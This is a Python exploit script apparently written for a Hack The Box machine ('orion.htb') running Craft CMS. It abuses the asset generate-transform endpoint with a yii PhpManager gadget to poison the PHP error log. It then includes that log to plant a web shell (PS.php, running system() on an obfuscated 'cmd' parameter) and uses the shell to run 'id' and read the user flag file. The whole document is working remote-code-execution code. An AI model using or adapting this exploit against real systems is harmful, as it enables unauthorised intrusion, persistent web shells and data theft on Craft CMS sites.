import requests, re, time

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def send(body):
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        print('  DEBUG: no CSRF')
        print('  First 400:', r.text[:400])
        return None
    csrf = m.group(1)
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers={**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}, timeout=30)
    return r2

shell_file = '/var/www/html/craft/web/PS.php'
error_log = '/var/www/html/craft/storage/logs/phperrors.log'

# Step 1: Inject PHP code into error_log via require() failure
php_code = (
    '<?php file_put_contents(\''
    + shell_file
    + '\', \'<?php system($_GET[chr(99).chr(109).chr(100)]); ?>\'); ?>'
)
inject_path = '/nonexistent_dir/' + php_code

print('Step 1: Inject PHP into error_log')
print(f'  inject_path[60]: {inject_path[:60]}...')

body1 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': inject_path
        }
    }
}
r1 = send(body1)
print(f'  Response: {r1.status_code if r1 else "None"}')
if r1:
    for kw in ['require(', 'Failed opening', '<?php', 'file_put_contents', 'PS.php']:
        if kw in r1.text:
            idx = r1.text.index(kw)
            print(f'  [{kw}] at {idx}: {r1.text[idx:idx+100]}')
else:
    sys.exit(1)

# Step 2: Include error_log
print('\nStep 2: Include error_log')
time.sleep(3)
body2 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': error_log
        }
    }
}
r2 = send(body2)
print(f'  Response: {r2.status_code if r2 else "None"}')
if r2:
    for kw in ['<?php', 'file_put_contents', 'PS.php', 'nonexistent', 'require(']:
        if kw in r2.text:
            idx = r2.text.index(kw)
            print(f'  [{kw}] at {idx}: {r2.text[idx:idx+80]}')

# Step 3: Check shell
print('\nStep 3: Check shell')
time.sleep(2)
r3 = requests.get(f'{HOST}/PS.php?cmd=id', headers=HEADERS, timeout=10)
print(f'  Status: {r3.status_code}')
if r3.status_code == 200:
    print(f'  [+] SHELL: {r3.text[:1000]}')
    r4 = requests.get(f'{HOST}/PS.php?cmd=cat /home/adam/user.txt', headers=HEADERS, timeout=10)
    if r4.status_code == 200:
        print(f'  [+] USER FLAG: {r4.text[:200]}')
else:
    print(f'  Body: {r3.text[:200]}')
